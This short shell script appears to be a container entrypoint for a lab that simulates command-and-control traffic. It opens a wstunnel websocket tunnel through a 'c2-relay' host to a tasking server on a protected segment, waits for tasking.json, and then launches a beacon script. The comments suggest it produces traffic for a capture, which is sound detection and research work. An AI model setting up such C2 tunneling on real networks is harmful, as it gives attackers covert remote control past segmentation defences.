#!/bin/sh
set -eu

# Local listener 9000 -> relay -> tasking server on the protected segment.
wstunnel client --log-lvl=WARN \
    -L tcp://127.0.0.1:9000:beacon:80 \
    ws://c2-relay:8080 &
tunnel_pid=$!

# Wait for the local listener before the first beacon so the capture does not
# start with a burst of connection errors.
i=0
while [ "$i" -lt 30 ]; do
    if curl -fsS --max-time 2 http://127.0.0.1:9000/tasking.json >/dev/null 2>&1; then
        break
    fi
    i=$((i + 1))
    sleep 1
done

/beacon.sh &
beacon_pid=$!

# If the tunnel client dies the beacon is useless; exit so the platform restart
# policy rebuilds the workstation instead of leaving a silent container.
wait "$tunnel_pid"
kill "$beacon_pid" 2>/dev/null || true
exit 1
